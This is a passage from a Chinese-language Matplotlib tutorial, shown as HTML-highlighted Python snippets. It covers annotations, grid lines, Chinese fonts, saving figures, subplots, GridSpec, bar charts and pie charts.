class="number">1</span>, <span class="number">3</span>])</span><br><span class="line">x = <span class="number">3</span> * np.pi / <span class="number">4</span></span><br><span class="line">plt.scatter([x,],[<span class="number">3</span> * np.sin(x),], <span class="number">50</span>, color =<span class="string">&#x27;blue&#x27;</span>)</span><br><span class="line">plt.annotate(<span class="string">r&#x27;$(3\sin(\frac&#123;3\pi&#125;&#123;4&#125;),\frac&#123;3&#125;&#123;\sqrt&#123;2&#125;&#125;)$&#x27;</span>,</span><br><span class="line">         xy=(x, <span class="number">3</span> * np.sin(x)), </span><br><span class="line">         xycoords=<span class="string">&#x27;data&#x27;</span>,</span><br><span class="line">         xytext=(+<span class="number">20</span>, +<span class="number">20</span>), </span><br><span class="line">         textcoords=<span class="string">&#x27;offset points&#x27;</span>, </span><br><span class="line">         fontsize=<span class="number">16</span>,</span><br><span class="line">         arrowprops=dict(facecolor=<span class="string">&#x27;blue&#x27;</span>, headwidth=<span class="number">10</span>, headlength=<span class="number">10</span>, width=<span class="number">2</span>, shrink=<span class="number">0.1</span>))</span><br><span class="line">plt.plot(X, F1, label=<span class="string">&quot;$sin(x)$&quot;</span>)</span><br><span class="line">plt.plot(X, F2, label=<span class="string">&quot;$3 sin(x)$&quot;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&#x27;lower left&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-90.png" alt="标注" /></p><h2 id="网格线"><a class="markdownIt-Anchor" href="#网格线"></a> 网格线</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.grid(color=<span class="string">&#x27;b&#x27;</span>, alpha=<span class="number">0.5</span>, linestyle=<span class="string">&#x27;dashed&#x27;</span>, linewidth=<span class="number">1.0</span>)</span><br></pre></td></tr></table></figure><h2 id="中文字体"><a class="markdownIt-Anchor" href="#中文字体"></a> 中文字体</h2><ul><li><p>Matplotlib默认是不支持显示中文字符的，可以使用 rc 配置（rcParams）来自定义图形的各种默认属性。</p></li><li><p>Windows操作系统支持的中文字体和代码：</p></li></ul><table><thead><tr><th>字体</th><th>代码</th></tr></thead><tbody><tr><td>黑体</td><td>SimHei</td></tr><tr><td>仿宋</td><td>FangSong</td></tr><tr><td>楷体</td><td>KaiTi</td></tr><tr><td>微软雅黑</td><td>Microsoft YaHei</td></tr><tr><td>宋体</td><td>SimSun</td></tr><tr><td>隶书</td><td>LiSu</td></tr><tr><td>幼圆</td><td>YouYuan</td></tr><tr><td>华文细黑</td><td>STXihei</td></tr><tr><td>华文楷体</td><td>STKaiti</td></tr><tr><td>华文宋体</td><td>STSong</td></tr><tr><td>华文中宋</td><td>STZhongsong</td></tr><tr><td>华文仿宋</td><td>STFangsong</td></tr><tr><td>方正舒体</td><td>FZShuTi</td></tr><tr><td>方正姚体</td><td>FZYaoti</td></tr><tr><td>华文彩云</td><td>STCaiyun</td></tr><tr><td>华文琥珀</td><td>STHupo</td></tr><tr><td>华文隶书</td><td>STLiti</td></tr><tr><td>华文行楷</td><td>STXingkai</td></tr><tr><td>华文新魏</td><td>STXinwei</td></tr></tbody></table><ul><li>配置方法：<br /><code>plt.rcParams['font.family'] = ['sans-serif'] plt.rcParams['font.sans-serif'] = ['SimHei']</code></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 全局设置：在jupyter notebook 中，设置下面两行来显示中文</span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.family&#x27;</span>] = [<span class="string">&#x27;sans-serif&#x27;</span>]</span><br><span class="line"><span class="comment"># 在 PyCharm 中，只需要下面一行 </span></span><br><span class="line">plt.rcParams[<span class="string">&#x27;font.sans-serif&#x27;</span>] = [<span class="string">&#x27;SimHei&#x27;</span>]</span><br><span class="line"><span class="comment"># 单独设置：在每一处使用到中文输出的地方，都加上一个字体属性fontproperties</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;日期&#x27;</span>, fontproperties=<span class="string">&#x27;SimHei&#x27;</span>, size=<span class="number">16</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;摄氏度&#x27;</span>, fontproperties=<span class="string">&#x27;SimHei&#x27;</span>, size=<span class="number">16</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;温度变化&#x27;</span>, fontproperties=<span class="string">&#x27;SimHei&#x27;</span>, size=<span class="number">16</span>)</span><br></pre></td></tr></table></figure><h2 id="保存图形"><a class="markdownIt-Anchor" href="#保存图形"></a> 保存图形</h2><ul><li><code>fig.savefig(&quot;filename.png&quot;)</code></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fig = plt.figure()</span><br><span class="line">plt.plot([<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], [<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">11</span>])</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Months&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Books Read&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line">fig.savefig(<span class="string">&#x27;books_read.png&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="加载图形"><a class="markdownIt-Anchor" href="#加载图形"></a> 加载图形</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.image <span class="keyword">as</span> mpimg</span><br><span class="line">img = mpimg.imread(<span class="string">&#x27;books_read.png&#x27;</span>)</span><br><span class="line">plt.imshow(img)</span><br></pre></td></tr></table></figure><h2 id="高质量svg矢量图输出"><a class="markdownIt-Anchor" href="#高质量svg矢量图输出"></a> 高质量svg矢量图输出</h2><ul><li><p>Jupyter Notebook中显示svg矢量图的设置： %config InlineBackend.figure_format = ‘svg’</p></li><li><p>保存svg矢量图</p></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">%config InlineBackend.figure_format = <span class="string">&#x27;svg&#x27;</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">fig.savefig(<span class="string">&#x27;celsius_degrees.svg&#x27;</span>)  <span class="comment"># 设置保存格式</span></span><br></pre></td></tr></table></figure><h2 id="面向对象的api绘图"><a class="markdownIt-Anchor" href="#面向对象的api绘图"></a> 面向对象的API绘图</h2><ul><li>Matplotlib绘图库的操作是通过API实现的，一种操作方法是类似MATLAB的函数接口的API；另一种操作方法是面向对象的API。这两种API可以并行使用，不过函数接口的API的易用性明显好于面向对象的API。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># --------------面向对象------------------</span></span><br><span class="line">fig = plt.figure()  <span class="comment"># 实例化对象</span></span><br><span class="line">X = np.arange(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">Y = np.random.randint(<span class="number">1</span>,<span class="number">20</span>, size=<span class="number">10</span>)</span><br><span class="line">left, bottom, width, height = <span class="number">0.1</span>, <span class="number">0.1</span>, <span class="number">0.8</span>, <span class="number">0.8</span></span><br><span class="line">axes = fig.add_axes([left, bottom, width, height]) <span class="comment"># 创建轴的实例</span></span><br><span class="line">axes.plot(X, Y, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">axes.set_xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axes.set_ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">axes.set_title(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">plt.show(fig)</span><br><span class="line"><span class="comment"># ----------------调用函数----------------</span></span><br><span class="line">X = np.arange(<span class="number">0</span>,<span class="number">10</span>)</span><br><span class="line">Y = np.random.randint(<span class="number">1</span>,<span class="number">20</span>, size=<span class="number">10</span>)</span><br><span class="line">plt.plot(X, Y, <span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h3 id="使用实例对象绘制图中图"><a class="markdownIt-Anchor" href="#使用实例对象绘制图中图"></a> 使用实例对象绘制图中图</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fig = plt.figure()</span><br><span class="line">X = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">Y = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>]</span><br><span class="line">axes1 = fig.add_axes([<span class="number">0.1</span>, <span class="number">0.1</span>, <span class="number">0.9</span>, <span class="number">0.9</span>]) <span class="comment"># main axes</span></span><br><span class="line"><span class="comment"># add_axes 参数rect The dimensions [left, bottom, width, height] of the new axes. </span></span><br><span class="line"><span class="comment"># All quantities are in fractions of figure width and height.</span></span><br><span class="line">axes2 = fig.add_axes([<span class="number">0.2</span>, <span class="number">0.6</span>, <span class="number">0.4</span>, <span class="number">0.3</span>]) <span class="comment"># inside axes</span></span><br><span class="line"><span class="comment"># main figure</span></span><br><span class="line">axes1.plot(X, Y, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">axes1.set_xlabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axes1.set_ylabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">axes1.set_title(<span class="string">&#x27;title&#x27;</span>)</span><br><span class="line"><span class="comment"># insert</span></span><br><span class="line">axes2.plot(Y, X, <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">axes2.set_xlabel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">axes2.set_ylabel(<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axes2.set_title(<span class="string">&#x27;title inside&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="设定绘图范围"><a class="markdownIt-Anchor" href="#设定绘图范围"></a> 设定绘图范围</h3><ul><li><code>set_ylim</code>和<code>set_xlim</code>：配置轴的范围可以通过在轴对象中使用set_ylim和set_xlim方法来完成</li><li>使用axis(‘tight’)，可以自动创建&quot;tightly fitted&quot; 的轴范围：</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fig, axes = plt.subplots(<span class="number">1</span>, <span class="number">3</span>, figsize=(<span class="number">10</span>, <span class="number">4</span>))</span><br><span class="line"><span class="comment"># axes[0] default axes ranges</span></span><br><span class="line">axes[<span class="number">1</span>].axis(<span class="string">&#x27;tight&#x27;</span>) </span><br><span class="line">axes[<span class="number">2</span>].set_ylim([<span class="number">0</span>, <span class="number">60</span>])</span><br><span class="line">axes[<span class="number">2</span>].set_xlim([<span class="number">2</span>, <span class="number">5</span>])</span><br></pre></td></tr></table></figure><h3 id="logarithmic-scale对数尺度"><a class="markdownIt-Anchor" href="#logarithmic-scale对数尺度"></a> Logarithmic Scale对数尺度</h3><ul><li><code>set_xscale和set_yscale</code></li><li>可以为一个或两个轴设置对数尺度，默认是线型尺度</li><li>使用接受一个参数（值为log）的set_xscale和set_yscale方法分别设置每个轴的scale</li></ul><p><img src="/images/pasted-91.png" alt="对数尺度" /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.add_subplot(<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">x = np.arange(<span class="number">0</span>, <span class="number">5</span>, <span class="number">0.25</span>)</span><br><span class="line">ax.plot(x, x**<span class="number">2</span>, x, x**<span class="number">3</span>)</span><br><span class="line">ax.set_yscale(<span class="string">&quot;log&quot;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h1 id="多子图"><a class="markdownIt-Anchor" href="#多子图"></a> 多子图</h1><h2 id="subplot"><a class="markdownIt-Anchor" href="#subplot"></a> subplot</h2><ul><li><code>subplot(nrows, ncols, plot_number)</code> nrows * ncols个子轴</li><li>参数plot_number标识函数调用创建的subplot。 plot_number的范围可以从1到最大nrows * ncols。</li><li>如果三个参数的值小于10，则可以使用一个int参数调用函数subplot，其中百位数表示nrows，十位数表示ncols，个位数表示plot_number。 这意味着：可以写subplot(234)来代替subplot(2, 3, 4) 。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">6</span>, <span class="number">4</span>))</span><br><span class="line">plt.subplot(<span class="number">221</span>)</span><br><span class="line">plt.text(<span class="number">0.5</span>, <span class="comment"># x coordinate, 0 leftmost positioned, 1 rightmost</span></span><br><span class="line">         <span class="number">0.5</span>, <span class="comment"># y coordinate, 0 topmost positioned, 1 bottommost</span></span><br><span class="line">         <span class="string">&#x27;subplot(2,2,1)&#x27;</span>, <span class="comment"># the text which will be printed</span></span><br><span class="line">         horizontalalignment=<span class="string">&#x27;center&#x27;</span>, <span class="comment"># shortcut &#x27;ha&#x27; </span></span><br><span class="line">         verticalalignment=<span class="string">&#x27;center&#x27;</span>, <span class="comment"># shortcut &#x27;va&#x27;</span></span><br><span class="line">         fontsize=<span class="number">20</span>, <span class="comment"># can be named &#x27;font&#x27; as well</span></span><br><span class="line">         alpha=<span class="number">.7</span> <span class="comment"># float (0.0 transparent through 1.0 opaque)</span></span><br><span class="line">         )</span><br><span class="line">python_course_green = <span class="string">&quot;#90EE90&quot;</span></span><br><span class="line">plt.subplot(<span class="number">224</span>, facecolor=python_course_green)</span><br><span class="line">plt.xticks(())  <span class="comment"># 去除刻度</span></span><br><span class="line">plt.yticks(())</span><br><span class="line">plt.text(<span class="number">0.5</span>, <span class="number">0.5</span>, </span><br><span class="line">         <span class="string">&#x27;subplot(2,2,4)&#x27;</span>, </span><br><span class="line">         ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>,</span><br><span class="line">         fontsize=<span class="number">20</span>, </span><br><span class="line">         color=<span class="string">&quot;b&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li><code>add_subplot()</code>面向对象的方法</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">fig = plt.figure(figsize=(<span class="number">6</span>, <span class="number">4</span>))</span><br><span class="line">sub1 = fig.add_subplot(<span class="number">221</span>) <span class="comment"># equivalent to: plt.subplot(2, 2, 1)</span></span><br><span class="line">sub1.text(<span class="number">0.5</span>, <span class="comment"># x coordinate, 0 leftmost positioned, 1 rightmost</span></span><br><span class="line">          <span class="number">0.5</span>, <span class="comment"># y coordinate, 0 topmost positioned, 1 bottommost</span></span><br><span class="line">          <span class="string">&#x27;subplot(2,2,1)&#x27;</span>, <span class="comment"># the text which will be printed</span></span><br><span class="line">          horizontalalignment=<span class="string">&#x27;center&#x27;</span>, <span class="comment"># shortcut &#x27;ha&#x27; </span></span><br><span class="line">          verticalalignment=<span class="string">&#x27;center&#x27;</span>, <span class="comment"># shortcut &#x27;va&#x27;</span></span><br><span class="line">          fontsize=<span class="number">20</span>, <span class="comment"># can be named &#x27;font&#x27; as well</span></span><br><span class="line">          alpha=<span class="number">.7</span> <span class="comment"># float (0.0 transparent through 1.0 opaque)</span></span><br><span class="line">          )</span><br><span class="line">python_course_green = <span class="string">&quot;#90EE90&quot;</span></span><br><span class="line">sub2 = fig.add_subplot(<span class="number">224</span>, facecolor=python_course_green)</span><br><span class="line">sub2.text(<span class="number">0.5</span>, <span class="number">0.5</span>, </span><br><span class="line">          <span class="string">&#x27;subplot(2,2,4)&#x27;</span>, </span><br><span class="line">          ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>,</span><br><span class="line">          fontsize=<span class="number">20</span>, </span><br><span class="line">          color=<span class="string">&quot;b&quot;</span>)</span><br><span class="line">sub2.set_xticks([])</span><br><span class="line">sub2.set_yticks([]) </span><br><span class="line">sub4 = fig.add_subplot(<span class="number">224</span>, facecolor=<span class="string">&quot;lightgrey&quot;</span>)</span><br><span class="line">sub4.plot(x, y)</span><br><span class="line">plt.plot(x, y)</span><br><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">fig =plt.figure(figsize=(<span class="number">6</span>,<span class="number">4</span>))</span><br><span class="line">fig.subplots_adjust(bottom=<span class="number">0.025</span>, left=<span class="number">0.025</span>, top = <span class="number">0.975</span>, right=<span class="number">0.975</span>) <span class="comment"># 调整大小</span></span><br><span class="line">X = [ (<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>) ] <span class="comment"># 211合并了一整行</span></span><br><span class="line"><span class="keyword">for</span> nrows, ncols, plot_number <span class="keyword">in</span> X:</span><br><span class="line">    plt.subplot(nrows, ncols, plot_number)</span><br><span class="line">    sub.set_xticks([])</span><br><span class="line">    sub.set_yticks([])</span><br><span class="line"><span class="comment"># -----------元组的形式-------------</span></span><br><span class="line">X = [ (<span class="number">2</span>,<span class="number">3</span>,(<span class="number">1</span>,<span class="number">3</span>)), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>), (<span class="number">2</span>,<span class="number">3</span>,<span class="number">6</span>) ]</span><br><span class="line"><span class="keyword">for</span> nrows, ncols, plot_number <span class="keyword">in</span> X:</span><br><span class="line">    sub = fig.add_subplot(nrows, ncols, plot_number)</span><br><span class="line">    sub.set_xticks([])</span><br><span class="line">    sub.set_yticks([])</span><br></pre></td></tr></table></figure><h2 id="gridspec"><a class="markdownIt-Anchor" href="#gridspec"></a> gridspec</h2><ul><li>GridSpec类。 它可以替代subplot来指定要创建的子图的几何布局。 GridSpec背后的基本思想是“grid”。 一个grid(网格)有多个行和列。 必须在此之后定义一个subplot应该跨越多少网格。</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib.gridspec <span class="keyword">import</span> GridSpec</span><br><span class="line">fig = plt.figure()</span><br><span class="line"><span class="comment"># 定义图形从可用figure区域的底部的20％、左侧的15％开始</span></span><br><span class="line">gs = GridSpec(<span class="number">1</span>, <span class="number">1</span>, </span><br><span class="line">              bottom=<span class="number">0.2</span>,</span><br><span class="line">              left=<span class="number">0.15</span>,</span><br><span class="line">              top=<span class="number">0.8</span>)</span><br><span class="line">ax = fig.add_subplot(gs[<span class="number">0</span>,<span class="number">0</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>精细化设置</li><li><code>figsize(float, float)</code>: optional, default: None<ul><li>width, height in inches. If not provided, defaults to rcParams[“figure.figsize”] (default: [6.4, 4.8]) = [6.4, 4.8].</li></ul></li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.gridspec <span class="keyword">as</span> gridspec</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> pl</span><br><span class="line">pl.figure(figsize=(<span class="number">6</span>, <span class="number">4</span>))</span><br><span class="line">G = gridspec.GridSpec(<span class="number">3</span>, <span class="number">3</span>) <span class="comment"># 定义3*3大小</span></span><br><span class="line">axes_1 = pl.subplot(G[<span class="number">0</span>, :]) <span class="comment"># 占据0行，3列</span></span><br><span class="line">pl.text(<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="string">&#x27;Axes 1&#x27;</span>, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>, size=<span class="number">24</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">axes_2 = pl.subplot(G[<span class="number">1</span>, :<span class="number">-1</span>]) <span class="comment"># 占据1行前2列</span></span><br><span class="line">pl.text(<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="string">&#x27;Axes 2&#x27;</span>, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>, size=<span class="number">24</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">axes_3 = pl.subplot(G[<span class="number">1</span>:, <span class="number">-1</span>]) <span class="comment"># 占据1行到最后一行得最后1列</span></span><br><span class="line">pl.text(<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="string">&#x27;Axes 3&#x27;</span>, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>, size=<span class="number">24</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">axes_4 = pl.subplot(G[<span class="number">-1</span>, <span class="number">0</span>]) <span class="comment"># 占据最后1行0列</span></span><br><span class="line">pl.text(<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="string">&#x27;Axes 4&#x27;</span>, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>, size=<span class="number">24</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">axes_5 = pl.subplot(G[<span class="number">-1</span>, <span class="number">-2</span>]) <span class="comment"># 占据最后一行导数第二列</span></span><br><span class="line">pl.text(<span class="number">0.5</span>, <span class="number">0.5</span>, <span class="string">&#x27;Axes 5&#x27;</span>, ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;center&#x27;</span>, size=<span class="number">24</span>, alpha=<span class="number">.5</span>)</span><br><span class="line">pl.tight_layout()</span><br><span class="line">pl.show()</span><br></pre></td></tr></table></figure><h1 id="更多图形种类"><a class="markdownIt-Anchor" href="#更多图形种类"></a> 更多图形种类</h1><ul><li>详细使用案例可以<a href="https://matplotlib.org/api/pyplot_summary.html">参考官网</a></li></ul><h2 id="条形图"><a class="markdownIt-Anchor" href="#条形图"></a> 条形图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">years = (<span class="string">&#x27;2015&#x27;</span>, <span class="string">&#x27;2016&#x27;</span>, <span class="string">&#x27;2017&#x27;</span>, <span class="string">&#x27;2018&#x27;</span>, <span class="string">&#x27;2019&#x27;</span>)</span><br><span class="line">visitors = (<span class="number">1241</span>, <span class="number">50927</span>, <span class="number">162242</span>, <span class="number">222093</span>, <span class="number">296665</span> / <span class="number">8</span> * <span class="number">12</span>)</span><br><span class="line">index = np.arange(len(visitors))</span><br><span class="line">bar_width = <span class="number">1.0</span></span><br><span class="line">plt.bar(index, visitors, bar_width,  color=<span class="string">&quot;green&quot;</span>)</span><br><span class="line">plt.xticks(index + bar_width / <span class="number">2</span>, years) <span class="comment"># labels get centered</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>分组条形图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">labels = [<span class="string">&#x27;G1&#x27;</span>, <span class="string">&#x27;G2&#x27;</span>, <span class="string">&#x27;G3&#x27;</span>, <span class="string">&#x27;G4&#x27;</span>, <span class="string">&#x27;G5&#x27;</span>]</span><br><span class="line">men_means = [<span class="number">20</span>, <span class="number">34</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">27</span>]</span><br><span class="line">women_means = [<span class="number">25</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">20</span>, <span class="number">25</span>]</span><br><span class="line">x = np.arange(len(labels))  <span class="comment"># the label locations</span></span><br><span class="line">width = <span class="number">0.35</span>  <span class="comment"># the width of the bars</span></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">rects1 = ax.bar(x - width/<span class="number">2</span>, men_means, width, label=<span class="string">&#x27;Men&#x27;</span>)</span><br><span class="line">rects2 = ax.bar(x + width/<span class="number">2</span>, women_means, width, label=<span class="string">&#x27;Women&#x27;</span>)</span><br><span class="line"><span class="comment"># Add some text for labels, title and custom x-axis tick labels, etc.</span></span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Scores&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Scores by group and gender&#x27;</span>)</span><br><span class="line">ax.set_xticks(x)</span><br><span class="line">ax.set_xticklabels(labels)</span><br><span class="line">ax.legend()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">autolabel</span>(<span class="params">rects</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Attach a text label above each bar in *rects*, displaying its height.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> rect <span class="keyword">in</span> rects:</span><br><span class="line">        height = rect.get_height()</span><br><span class="line">        ax.annotate(<span class="string">&#x27;&#123;&#125;&#x27;</span>.format(height),</span><br><span class="line">                    xy=(rect.get_x() + rect.get_width() / <span class="number">2</span>, height),</span><br><span class="line">                    xytext=(<span class="number">0</span>, <span class="number">3</span>),  <span class="comment"># 3 points vertical offset</span></span><br><span class="line">                    textcoords=<span class="string">&quot;offset points&quot;</span>,</span><br><span class="line">                    ha=<span class="string">&#x27;center&#x27;</span>, va=<span class="string">&#x27;bottom&#x27;</span>)</span><br><span class="line">autolabel(rects1)</span><br><span class="line">autolabel(rects2)</span><br><span class="line">fig.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><ul><li>堆叠条形图</li></ul><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line">labels = [<span class="string">&#x27;G1&#x27;</span>, <span class="string">&#x27;G2&#x27;</span>, <span class="string">&#x27;G3&#x27;</span>, <span class="string">&#x27;G4&#x27;</span>, <span class="string">&#x27;G5&#x27;</span>]</span><br><span class="line">men_means = [<span class="number">20</span>, <span class="number">35</span>, <span class="number">30</span>, <span class="number">35</span>, <span class="number">27</span>]</span><br><span class="line">women_means = [<span class="number">25</span>, <span class="number">32</span>, <span class="number">34</span>, <span class="number">20</span>, <span class="number">25</span>]</span><br><span class="line">men_std = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">women_std = [<span class="number">3</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">3</span>]</span><br><span class="line">width = <span class="number">0.35</span>       <span class="comment"># the width of the bars: can also be len(x) sequence</span></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.bar(labels, men_means, width, yerr=men_std, label=<span class="string">&#x27;Men&#x27;</span>)</span><br><span class="line">ax.bar(labels, women_means, width, yerr=women_std, bottom=men_means,</span><br><span class="line">       label=<span class="string">&#x27;Women&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;Scores&#x27;</span>)</span><br><span class="line">ax.set_title(<span class="string">&#x27;Scores by group and gender&#x27;</span>)</span><br><span class="line">ax.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="饼图"><a class="markdownIt-Anchor" href="#饼图"></a> 饼图</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># Pie chart, where the slices will be ordered and plotted counter-clockwise:</span></span><br><span class="line">labels = <span class="string">&#x27;Frogs&#x27;</span>, <span class="string">&#x27;Hogs&#x27;</span>, <span class="string">&#x27;Dogs&#x27;</span>, <span class="string">&#x27;Logs&#x27;</span></span><br><span class="line">sizes = [<span class="number">15</span>, <span class="number">30</span>, <span class="number">45</span>, <span class="number">10</span>]</span><br><span class="line">explode = (<span class="number">0</span>, <span class="number">0.1</span>, <span class="number">0</span>, <span class="number">0</span>)  <span class="comment"># only &quot;explode&quot; the 2nd slice (i.e. &#x27;Hogs&#x27;)</span></span><br><span class="line">fig1, ax1 = plt.subplots()</span><br><span class="line">ax1.pie(sizes, explode=explode, labels=labels, autopct=<span class="string">&#x27;%1.1f%%&#x27;</span>,</span><br><span class="line">        shadow=<span class="literal">True</span>, startangle=<span class="number">90</span>)</span><br><span class="line">ax1.axis(<span class="string">&#x27;equal&#x27;</span>)  <span class="comment"># Equal aspect ratio ensures that pie is drawn as a circle.</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>x</td><td>(每一块)的比例，如果sum(x) &gt; 1会使用sum(x)归一化；</td></tr><tr><td>labels</td><td>(每一块)饼图外侧显示的说明文字；</td></tr><tr><td>explode</td><td>(每一块)离开中心距离；</td></tr><tr><td>startangle</td><td>起始绘制角度,默认图是从x轴正方向逆时针画起,如设定=90则从y轴正方向画起；</td></tr><tr><td>shadow</td><td>在饼图下面画一个阴影。默认值：False，即不画阴影；</td></tr><tr><td>labeldistance</td><td>label标记的绘制位置,相对于半径的比例，默认值为1.1, 如&lt;1则绘制在饼图内侧；</td></tr><tr><td>autopct</td><td>控制饼图内百分比设置,可以使用format字符串或者format function;’%1.1f’指小数点前后位数(没有用空格补齐)；</td></tr><tr><td>pctdistance</td><td>类似于labeldistance,指定autopct的位置刻度,默认值为0.6；</td></tr><tr><td>radius</td><td>控制饼图半径，默认值为1；counterclock 